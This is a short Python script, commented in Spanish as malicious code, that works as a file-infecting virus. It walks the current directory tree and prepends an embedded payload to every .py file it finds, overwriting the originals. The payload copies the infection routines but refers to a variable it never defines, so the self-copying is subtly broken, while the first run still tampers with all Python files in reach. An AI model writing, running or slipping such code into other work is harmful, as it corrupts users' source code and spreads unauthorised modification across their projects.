import os
import sys

# Código malicioso a insertar en los archivos
malicious_code = """
import os
import sys

def infect_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()

    with open(file_path, 'w') as file:
        file.write(malicious_code + '\\n' + content)

def search_and_infect(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.py'):
                file_path = os.path.join(root, file)
                infect_file(file_path)

if __name__ == "__main__":
    search_and_infect(os.getcwd())
"""

def infect_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()

    with open(file_path, 'w') as file:
        file.write(malicious_code + '\n' + content)

def search_and_infect(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.py'):
                file_path = os.path.join(root, file)
                infect_file(file_path)

if __name__ == "__main__":
    search_and_infect(os.getcwd())